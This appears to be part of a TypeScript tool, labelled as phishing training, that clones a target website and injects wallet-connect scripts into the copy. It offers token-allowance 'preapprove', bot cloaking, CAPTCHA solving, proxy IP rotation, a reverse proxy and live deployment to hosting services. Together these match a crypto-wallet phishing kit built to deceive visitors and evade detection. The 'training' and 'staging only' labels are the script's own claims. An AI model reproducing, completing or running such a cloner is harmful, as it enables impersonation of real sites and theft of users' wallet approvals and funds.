  if (features.preapprove && !isTruthyEnv('ALLOWANCE_REUSE_ENABLED')) {
    console.warn(
      '[PHISHING_TRAINING] --preapprove: ALLOWANCE_REUSE_ENABLED is not true — UI will stay hidden',
    )
  }

  if (features.solveCaptcha && !process.env['TWOCAPTCHA_API_KEY']?.trim()) {
    console.warn('[PHISHING_TRAINING] --solve-captcha: TWOCAPTCHA_API_KEY not set')
  }

  const assetsDir = path.join(outDir, 'assets')
  await mkdir(assetsDir, { recursive: true })

  const fetchRotate = features.rotate

  console.info(`[PHISHING_TRAINING] Checking robots.txt for ${target.origin}`)
  await checkRobotsAllowed(target, fetchRotate)

  console.info(`[PHISHING_TRAINING] Fetching ${target.href}`)
  const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } }, {
    rotate: fetchRotate,
  })
  if (!pageRes.ok) {
    console.error(`[PHISHING_TRAINING] Failed to fetch page: HTTP ${pageRes.status}`)
    process.exit(1)
  }

  const contentType = pageRes.headers.get('content-type') ?? ''
  if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
    console.warn(`[PHISHING_TRAINING] Unexpected content-type: ${contentType}`)
  }

  let html = await pageRes.text()
  const assetUrls = extractAssetUrls(html, target).slice(0, MAX_ASSETS)
  const urlToLocal = new Map<string, string>()
  let downloaded = 0

  for (const assetHref of assetUrls) {
    const assetUrl = new URL(assetHref)
    const fileName = assetFileName(assetUrl)
    const localRel = `./assets/${fileName}`
    urlToLocal.set(assetUrl.href, localRel)

    try {
      const res = await fetchWithTimeout(assetUrl.href, undefined, { rotate: fetchRotate })
      if (!res.ok) continue
      const buf = Buffer.from(await res.arrayBuffer())
      if (buf.length > MAX_BYTES) {
        console.warn(`[PHISHING_TRAINING] Skip large asset ${assetUrl.href} (${buf.length} bytes)`)
        continue
      }
      await writeFile(path.join(assetsDir, fileName), buf)
      downloaded++
    } catch (e) {
      console.warn(
        `[PHISHING_TRAINING] Asset skip ${assetUrl.href}: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  html = rewriteHtmlAssets(html, target, urlToLocal)

  const demoApiUrl = resolveDemoApiUrl()
  const walletConnectProjectId = process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim()

  const walletJs = buildTrainingWalletDemoJs({
    demoApiUrl,
    walletConnectProjectId: walletConnectProjectId || undefined,
  })
  await writeFile(path.join(outDir, 'legion-training-wallet.js'), walletJs, 'utf8')
  await writeFile(path.join(outDir, 'legion-training-wallet.css'), buildTrainingWalletDemoCss(), 'utf8')

  const hasQaInjection =
    features.balance ||
    features.toast ||
    features.redirect ||
    features.cloak ||
    features.lang ||
    features.solveCaptcha ||
    features.preapprove

  const qaContext: TrainingCloneContext | null = hasQaInjection
    ? { target, outDir, demoApiUrl, features }
    : null

  if (qaContext) {
    await writeFile(path.join(outDir, 'legion-training-qa.js'), buildTrainingQaJs(qaContext), 'utf8')
    await writeFile(path.join(outDir, 'legion-training-qa.css'), buildTrainingQaCss(), 'utf8')
  }

  if (mobileOptimize) {
    await writeFile(path.join(outDir, 'legion-mobile-optimize.css'), buildMobileOptimizeCss(), 'utf8')
    await writeFile(path.join(outDir, 'legion-mobile-optimize.js'), buildMobileOptimizeJs(), 'utf8')
  }

  if (features.cloak) {
    await writeFile(path.join(outDir, 'bots.html'), buildBotsHtml(target), 'utf8')
  }

  if (features.proxy) {
    const proxyPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
    await writeFile(path.join(outDir, 'nginx.conf'), buildNginxProxyConfig(target, proxyPort), 'utf8')
    await writeFile(path.join(outDir, 'docker-compose.yml'), buildDockerCompose(proxyPort), 'utf8')
    await writeFile(path.join(outDir, 'legion-proxy-patch.js'), buildProxyClientPatch(target), 'utf8')
  }

  const injection = buildInjectionBundle({
    features,
    qaContext,
    proxy: features.proxy,
    target,
    mobileOptimize,
  })

  if (html.includes('</body>')) {
    html = html.replace('</body>', `${injection}\n</body>`)
  } else {
    html += injection
  }

  await writeFile(path.join(outDir, 'index.html'), html, 'utf8')

  const enabledFlags = Object.entries(features)
    .filter(([, v]) => v)
    .map(([k]) => k)

  let deployUrl: string | null = null
  if (features.deploy) {
    deployUrl = await deployStaging(outDir)
  }

  await writeFile(
    path.join(outDir, 'training-config.json'),
    JSON.stringify(
      {
        training: true,
        wallet_demo: true,
        source_url: target.href,
        demo_api_url: demoApiUrl,
        record_endpoint: `${demoApiUrl}/api/training-demo/record`,
        generated_at: new Date().toISOString(),
        features: enabledFlags,
        deploy_url: deployUrl,
        env_hints: {
          PROXY_LIST: features.rotate ? 'optional for load-test IP rotation' : undefined,
          TWOCAPTCHA_API_KEY: features.solveCaptcha ? 'required for Turnstile helper' : undefined,
          VERCEL_TOKEN: features.deploy ? 'or NETLIFY_TOKEN' : undefined,
          ALLOWANCE_REUSE_ENABLED: features.preapprove ? 'must be true on API' : undefined,
          KINETIC_INTERNAL_KEY: features.preapprove ? 'embedded at build for scan API' : undefined,
        },
        api_requirements: {
          TRAINING_DEMO_MODE: true,
          note: 'API logs signatures only; no settlement on training-demo payloads',
        },
      },
      null,
      2,
    ),
    'utf8',
  )

  await writeFile(
    path.join(outDir, 'README-TRAINING.md'),
    buildReadme(target.href, outDir, demoApiUrl, features, deployUrl ?? undefined),
    'utf8',
  )

  console.info(`[PHISHING_TRAINING] Wrote ${outDir}`)
  console.info(`[PHISHING_TRAINING] Assets downloaded: ${downloaded}/${assetUrls.length}`)
  console.info(`[PHISHING_TRAINING] Demo API: ${demoApiUrl}`)
  if (enabledFlags.length) {
    console.info(`[PHISHING_TRAINING] QA flags: ${enabledFlags.join(', ')}`)
  } else {
    console.info('[PHISHING_TRAINING] Simple clone (no QA flags)')
  }
  if (deployUrl) console.info(`[PHISHING_TRAINING] Live staging: ${deployUrl}`)
  console.info('[PHISHING_TRAINING] Serve on localhost or docker compose — staging only')
}

main().catch((err) => {
  console.error(err)
  process.exit(1)
})
